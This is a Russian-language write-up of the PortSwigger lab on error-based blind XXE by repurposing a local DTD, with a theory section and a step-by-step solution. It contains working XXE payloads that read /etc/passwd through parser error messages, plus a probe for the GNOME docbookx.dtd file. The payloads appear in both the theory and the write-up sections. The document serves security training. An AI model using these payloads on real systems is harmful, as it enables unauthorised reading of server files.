# Exploiting XXE to retrieve data by repurposing a local DTD

## Theory

<h3>Использование слепого XXE путем перепрофилирования локального DTD</h3>

Предыдущий метод прекрасно работает с внешним DTD, но обычно он не работает с внутренним DTD, полностью определенным в элементе DOCTYPE. Это связано с тем, что этот метод включает использование объекта параметра XML в определении другого объекта параметра. Согласно спецификации XML, это разрешено во внешних DTD, но не во внутренних DTD.

Так что насчет слепых уязвимостей XXE, когда заблокированы внеполосные взаимодействия? Вы не можете эксфильтровать данные через внешнее соединение и не можете загрузить внешний DTD с удаленного сервера.

В этой ситуации все еще может быть возможно вызвать сообщения об ошибках, содержащие конфиденциальные данные, из-за лазейки в спецификации языка XML. Если DTD документа использует гибрид внутренних и внешних объявлений DTD, то внутреннее DTD может переопределять сущности, объявленные во внешнем DTD. Когда это происходит, ограничение на использование объекта параметра XML в определении другого объекта параметра ослабляется.

Это означает, что злоумышленник может использовать основанный на ошибках метод XXE из внутреннего DTD при условии, что используемая им сущность параметра XML переопределяет сущность, объявленную во внешнем DTD. Конечно, если внеполосные соединения заблокированы, внешний DTD не может быть загружен из удаленного места. Вместо этого это должен быть внешний файл DTD, локальный для сервера приложений. По сути, атака включает в себя вызов файла DTD, который существует в локальной файловой системе, и переназначение его для переопределения существующего объекта таким образом, который вызывает ошибку синтаксического анализа, содержащую конфиденциальные данные.

Например, предположим, что в файловой системе сервера в расположении /usr/local/app/schema.dtd есть файл DTD, и этот файл DTD определяет объект с именем custom_entity. Злоумышленник может инициировать сообщение об ошибке синтаксического анализа XML, содержащее содержимое файла /etc/passwd, отправив гибридное DTD, подобное следующему:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

Это DTD выполняет следующие шаги:

* Определяет сущность параметра XML с именем local_dtd, содержащую содержимое внешнего файла DTD, существующего в файловой системе сервера.
* Переопределяет сущность параметра XML с именем custom_entity, которая уже определена во внешнем файле DTD. Объект переопределен как содержащий эксплойт XXE на основе ошибки, который уже был описан, для запуска сообщения об ошибке, содержащего содержимое файла /etc/passwd.
* Использует сущность local_dtd, чтобы внешнее DTD интерпретировалось, включая переопределенное значение сущности custom_entity. Это приводит к желаемому сообщению об ошибке.

<h3>Поиск существующего файла DTD для перепрофилирования</h3>

Поскольку эта XXE-атака включает в себя перепрофилирование существующего DTD в файловой системе сервера, ключевым требованием является поиск подходящего файла. Это на самом деле довольно просто. Поскольку приложение возвращает любые сообщения об ошибках, выдаваемые синтаксическим анализатором XML, вы можете легко перечислить локальные файлы DTD, просто попытавшись загрузить их из внутреннего DTD.

Например, системы Linux, использующие среду рабочего стола GNOME, часто имеют файл DTD в /usr/share/yelp/dtd/docbookx.dtd. Вы можете проверить наличие этого файла, отправив следующую полезную нагрузку XXE, которая вызовет ошибку, если файл отсутствует:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

После того, как вы проверили список общих файлов DTD, чтобы найти существующий файл, вам нужно получить копию файла и просмотреть ее, чтобы найти сущность, которую вы можете переопределить. Поскольку многие распространенные системы, включающие файлы DTD, имеют открытый исходный код, обычно вы можете быстро получить копию файлов с помощью поиска в Интернете.

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD/assets/1.png)

Выберем любой продукт.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD/assets/2.png)

Перейдем на его страницу и спустимся в самый низ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD/assets/3.png)

Нажмем на кнопку "Check stock" и перехватим запрос. Отправляем его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD/assets/4.png)

Модифицируем запрос и отправляем его. Код экплоита:
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD/assets/5.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD/assets/6.png)
